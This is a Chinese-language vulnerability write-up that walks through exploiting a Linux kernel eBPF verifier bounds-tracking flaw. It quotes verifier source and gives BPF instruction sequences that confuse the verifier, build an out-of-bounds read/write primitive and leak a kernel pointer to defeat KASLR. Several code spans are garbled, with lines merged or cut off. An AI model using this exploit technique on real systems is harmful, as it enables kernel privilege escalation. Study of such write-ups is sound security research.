### Exploitation
上述例子就是漏洞触发的路径，构造两个寄存器
    R2.var_off = {mask = 0xffffffff00000000, value = 0x01}; 即低32bits是known, 高32bits unkown.
    R3.var_off = {mask = 0x0, value = 0x100000002}; 即整个64bits是known的，值为0x100000002;
第二个相对更容易构造，因为所有的bit都是`known`的，直接可以赋值，但是由于指令的限制，我们只能用32bits运算
    BPF_LD_IMM64(BPF_REG_8, 0x1);                   // r8 = 0x1
            BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32);          // r8 var_off);
        s32 sval = (s32)val;
        switch (opcode) {
        ....
        case BPF_JGE:
            if (reg->u32_min_value >= val)
                return 1;
            else if (reg->u32_max_value u32_max_value u32_min_value > val)
                return 0;
            break;
        ...
        }
        return -1;
    }
对于`JGE`，这里判断如果最小值已经满足条件（大于等于给定的比较值）后，就会返回TRUE；而不会去判断最大值的合法性。同样的对于`BPF_JLE`，先判断最大值是否满足条件（小于等于给定值）；
配合上述构造的`umin_value > umax_value`的情况，此时永远会返回TRUE，但是在实际运行中，R6=0,
会运行到FALSE；造成路径的混淆。
这也就意味着理论上，我们可以将任意危险的代码 **藏在FALSE** 分支实现，veifier不会对其安全性校验。
但是，事实上，verifier对于它认为永远不可达的代码（dead code）做了patch处理
    static void sanitize_dead_code(struct bpf_verifier_env *env)
    {
        struct bpf_insn_aux_data *aux_data = env->insn_aux_data;
        struct bpf_insn trap = BPF_JMP_IMM(BPF_JA, 0, 0, -1);
        struct bpf_insn *insn = env->prog->insnsi;
        const int insn_cnt = env->prog->len;
        int i;
        for (i = 0; i allow_ptr_leaks.
     */
    static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,
                       struct bpf_insn *insn,
                       const struct bpf_reg_state *ptr_reg,
                       const struct bpf_reg_state *off_reg)
    {
        struct bpf_verifier_state *vstate = env->cur_state;
        struct bpf_func_state *state = vstate->frame[vstate->curframe];
        struct bpf_reg_state *regs = state->regs, *dst_reg;
        bool known = tnum_is_const(off_reg->var_off);
        s64 smin_val = off_reg->smin_value, smax_val = off_reg->smax_value,
            smin_ptr = ptr_reg->smin_value, smax_ptr = ptr_reg->smax_value;
        u64 umin_val = off_reg->umin_value, umax_val = off_reg->umax_value,
            umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;
        struct bpf_sanitize_info info = {};
        u8 opcode = BPF_OP(insn->code);
        u32 dst = insn->dst_reg;
        int ret;
        dst_reg = &regs[dst];
        if ((known && (smin_val != smax_val || umin_val != umax_val)) ||
            smin_val > smax_val || umin_val > umax_val) {
            /* Taint dst register if offset had invalid bounds derived from
             * e.g. dead branches.
             */
            __mark_reg_unknown(env, dst_reg);
            return 0;
        }
        ....
    }
这里的dst_reg就是指针寄存器，off_reg是参与运算的scalar寄存器；
有一种特殊情况，即当off_reg是一个常量且，off_reg.umin_val >
off_reg.umax_val时，dst_reg会被标记为`unknown`，即`scalar`寄存器。即此时verifier不再认为dst_reg是一个指针类型，将运行存于map里，结合上述的不合理情况的存在，可以造成泄漏内核地址信息。
而通过前面构造的两个寄存器，我们可以成功得到满足这个条件的寄存器。
接下来，为了获取kernel 任意地址读写能力，我们需要获取一个原语，它能满足这种条件，即veifier认为它的值为0，但实际运行时为1。
首先，对R6加1，相应的边界值都加1
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1);// r6 += 1; .umin_value=0x2; umax_value=0x1;
之后，一样的方法获取一个对于veifier是unknown的值（来自map），再通过 **JMP32** 更新其边界值
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),           // r6 += 1; .umin_value=0x2; umax_value=0x1;
            BPF_JMP32_IMM(JMP_JLE, BPF_REG_5, 1, 1),        // if r5 code);
        ...
        switch (opcode) {
        case BPF_ADD:
            scalar32_min_max_add(dst_reg, &src_reg);
            scalar_min_max_add(dst_reg, &src_reg);
            dst_reg->var_off = tnum_add(dst_reg->var_off, src_reg.var_off);
            break;
        ....
    }
    static void scalar32_min_max_add(struct bpf_reg_state *dst_reg,
                     struct bpf_reg_state *src_reg)
    {
        ....
            if (dst_reg->u32_min_value + umin_val u32_max_value + umax_val u32_min_value = 0;
                dst_reg->u32_max_value = U32_MAX;
            }
            else {
            dst_reg->u32_min_value += umin_val;
            dst_reg->u32_max_value += umax_val;
        }
    }
可以看到，在不会产生溢出的情况下，umin/umax_value只是dst和source相应的和。
也就是此时的R6.umin_value=umax_value = 0x2，此时verify 认为R6=0x2；runtime下R6=0x1
之后，利用0x2 & 0x1 == 0x0，构造出`verify: 0x0, runtime: 0x1`的情况
    BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1)        // verify: 0  runtime: 1
后续可以利用这一点完成越界读写。
##### 泄漏内核地址
map里的内容并不是存储在动态分配的堆内存中，而是在`bpf_array.value`，而同在`bpf_array`中，存在一个有用的结构体`bpf_map`
    struct bpf_array {
        struct bpf_map map;
        u32 elem_size;
        u32 index_mask;
        struct bpf_array_aux *aux;
        union {
            char value[0] __aligned(8);             // map's content
            void *ptrs[0] __aligned(8);
            void __percpu *pptrs[0] __aligned(8);
        };
    };
    struct bpf_map {
        /* The first two cachelines with read-mostly members of which some
         * are also accessed in fast-path (e.g. ops, max_entries).
         */
        const struct bpf_map_ops *ops ____cacheline_aligned;
        struct bpf_map *inner_map_meta;
    #ifdef CONFIG_SECURITY
        void *security;
    #endif
        enum bpf_map_type map_type;
        u32 key_size;
        u32 value_size;
        u32 max_entries;
        u64 map_extra; /* any per-map-type extra fields */
        u32 map_flags;
        int spin_lock_off; /* >=0 valid offset, =0 valid offset, <0 error */
        u32 id;
        int numa_node;
        u32 btf_key_type_id;
        u32 btf_value_type_id;
        u32 btf_vmlinux_value_type_id;
        struct btf *btf;
        ...
    };
其中最重要的一个成员就是`ops`，它指向了一个虚拟函数表，取决于map的类型。
例如有`array_map_ops/cpu_map_ops/dev_map_ops...`，这些结构体都位于`.rodata`，并且在`/proc/kallsyms`中有对应的导出符号，泄漏这些地址可以用于绕过KALSR.
`map_lookup_elem`我们可以获取任意一个map里elem的地址即`bpf_array.value`的地址，通过偏移计算（&value[0] -0x110）可以得到ops地址。
下述代码可以将`ops`地址存储在map.elem[4]中
    struct bpf_insn prog[] = {
            BPF_LD_MAP_FD(BPF_REG_9, mapfd),
            // {mask=0x0, value=0x1000000002}
            BPF_LD_IMM64(BPF_REG_8, 0x1),                   // r8 = 0x1
            BPF_ALU64_IMM(BPF_LSH, BPF_REG_8, 32),          // r8 <= 32     == 0x10000 0000
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 2),           // r8 += 2      == 0x10000 0000 2
            BPF_MAP_GET(0, BPF_REG_5),                      // r5 = map.elem[0]
            BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),            // r6 = r5
            BPF_MOV64_IMM(BPF_REG_2, 0xffffffff),           // r2 = 0xffffffff
            BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32),          // r2 <= 32     == 0xffffffff 00000000
            BPF_ALU64_IMM(BPF_AND, BPF_REG_6, BPF_REG_2),   // r6 &= r2   ; high32 unkown, low 32 known
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),         // r6.var_off = {mask=0xffffffff 00000000, value=0x01}
            //  Trigger the vuln
            BPF_ALU64_IMM(BPF_AND, BPF_REG_6, BPF_REG_8),       // r6 &= r8;    r6.umin_value=0x1; r6.umax_value=0x0
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),           // r6 += 1; .umin_value=0x2; umax_value=0x1;
            BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1, 1),        // if r5 <= 1 goto pc+1; 
                BPF_EXIT_INSN(),                            // r5.umin_value = 0x0, umax_value=0x1
                BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_5), // r6 +=r5 umin_value=umax_value=0x2
                // only take low 32 bits